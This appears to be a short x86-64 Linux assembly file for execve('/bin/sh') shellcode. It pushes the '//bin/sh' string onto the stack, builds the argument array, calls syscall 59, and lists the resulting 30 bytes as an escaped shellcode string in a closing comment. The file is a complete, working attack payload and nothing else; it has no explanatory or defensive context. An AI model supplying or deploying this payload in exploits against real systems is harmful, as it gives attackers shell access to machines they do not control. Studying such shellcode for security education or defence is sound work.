global _start
section .text

_start:
	xor rax, rax
	push rax
	pop rdx			
	push rdx
	mov rbx, 0x68732f6e69622f2f ; build //bin/sh
	push rbx		; copy ¨//bin/sh¨ string to stack
	mov rdi, rsp 	; get the address for /bin/sh string
	push rax		; build args array, by pushing NULL
	push rdi		; then pushing string address
	mov rsi, rsp	; args array address
	add eax, 59		; execve
	syscall
	
; Shellcode (30 bytes) - \x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x83\xc0\x3b\x0f\x05

